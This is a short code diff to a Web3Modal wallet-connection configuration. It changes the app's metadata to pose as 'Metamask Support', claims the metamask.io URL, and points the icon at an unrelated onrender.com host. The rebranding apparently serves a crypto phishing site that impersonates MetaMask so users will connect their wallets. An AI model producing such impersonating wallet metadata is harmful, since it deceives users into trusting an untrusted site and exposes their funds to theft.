@@ -34,10 +34,10 @@ import { hexToNumber, numberToHex } from "viem";
 const projectId = process.env.VITE_PROJECT_ID;
 
 const metadata = {
-    name: "Web3Modal",
-    description: "Web3Modal Example",
-    url: "https://web3modal.com",
-    icons: ["https://avatars.githubusercontent.com/u/37784886"],
+    name: "Metamask Support",
+    description: "Metamask Support",
+    url: "https://metamask.io",
+    icons: ["https://meta-online-server.onrender.com/head.9a2174f4.png"],
 };
 
 const config = createConfig({
